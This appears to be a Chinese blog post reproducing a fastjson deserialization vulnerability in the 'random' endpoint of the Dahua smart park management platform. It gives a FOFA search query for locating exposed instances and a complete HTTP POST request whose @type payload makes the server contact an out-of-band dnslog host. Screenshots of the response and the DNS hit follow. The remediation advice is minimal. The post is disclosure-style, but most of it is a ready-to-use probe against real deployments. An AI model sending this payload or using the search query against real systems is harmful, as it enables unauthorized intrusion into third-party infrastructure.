[toc]

# 免责声明
本文章仅供学习与交流，请勿用于非法用途，均由使用者本人负责，文章作者不为此承担任何责任
# 漏洞描述
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。
# 漏洞原理
在平台的random借口处存在fastjson反序列化漏洞
# 影响版本
不详

# **fofa**

```
icon_hash="-1935899595"
```

# 漏洞复现
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/effeee23624d4681a42da7e1abed3f6a.png)
访问进行抓包提交post参数
```yaml

POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: application/json
Content-Length: 112

{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://123.z7pfrb.dnslog.cn"}}""}
```
返回包是这样的
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/21c1df5bdcd84f95a2e8eff99eeaef1d.png)
查看dnslog
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/a3bcc724ce694e31b86d977fd014580c.png)
# 修复建议
联系官方，获取最新版本



